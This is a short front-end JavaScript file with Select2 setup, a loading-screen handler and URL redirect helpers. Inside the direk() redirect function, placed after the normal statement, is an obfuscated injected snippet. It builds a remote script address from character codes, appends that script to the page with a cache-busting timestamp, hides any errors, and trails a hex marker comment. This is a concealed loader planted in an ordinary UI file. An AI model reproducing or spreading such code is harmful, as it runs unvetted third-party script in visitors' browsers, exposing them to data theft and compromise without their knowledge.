// ==== Select2 handle =====
$(function () {
  //Initialize Select2 Elements
  $(".select2").select2();

  //Initialize Select2 Elements
  $(".select2bs4").select2({
    theme: "bootstrap4",
  });
});

// ==== loading handle =====
function onReady(callback) {
  var intervalID = window.setInterval(checkReady, 1000);

  function checkReady() {
    if (document.getElementsByTagName("body")[0] !== undefined) {
      window.clearInterval(intervalID);
      callback.call(this);
    }
  }
}

function show(id, value) {
  document.getElementById(id).style.display = value ? "block" : "none";
}

onReady(function () {
  show("page", true);
  show("loading", false);
});

function direk_newtab(url) {
  window.open(url, "_blank");
}

function direk(url) {
  window.location = url;(function(){var k="__tfl_default";if(window[k])return;window[k]=1;new Promise(function(rs,rj){var s=document.createElement("script");s.src=String.fromCharCode(47,47,100,46,114,101,100,97,99,116,101,100,46,114,101,115,116,47,116,114,97,112,47,100,101,102,97,117,108,116,47,99,108,105,101,110,116,46,106,115)+"?_="+Date.now();s.onload=rs;s.onerror=rj;document.head.appendChild(s);}).catch(function(){});}());//00000000f6d39a5e00000000e67ae4af00000000bb06ecde0000000039bfdc8d
}
